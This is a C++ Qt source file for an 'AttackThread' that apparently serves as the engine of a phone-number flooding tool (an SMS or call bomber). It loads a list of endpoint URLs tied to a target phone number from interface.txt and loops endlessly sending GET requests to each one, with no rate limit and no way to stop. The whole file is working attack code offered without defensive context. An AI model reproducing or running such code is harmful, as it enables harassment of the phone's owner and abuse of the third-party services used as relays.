#include <QUrl>
#include "attackthread.h"
#include "mainwindow.h"

AttackThread::AttackThread(){}

AttackThread::AttackThread(QString pn)
{
    PhoneNum.clear();
    PhoneNum = pn;
    readFile = new LoadInterface("interface.txt",PhoneNum);
}

AttackThread::~AttackThread()
{
    delete readFile;
}

void AttackThread::run()
{
    readUrl = readFile -> ReadInterfaceContent();
    QUrl url = readUrl.at(0);
    NetWorkUtill *startAttack = new NetWorkUtill(url);
    while(true)
    {
        for(int i = 0;i < readUrl.size();i++)
        {
            url = readUrl.at(i);
            startAttack->SendAttackForGet(url);
        }
        delete startAttack;
        startAttack = new NetWorkUtill(url);
    }
}
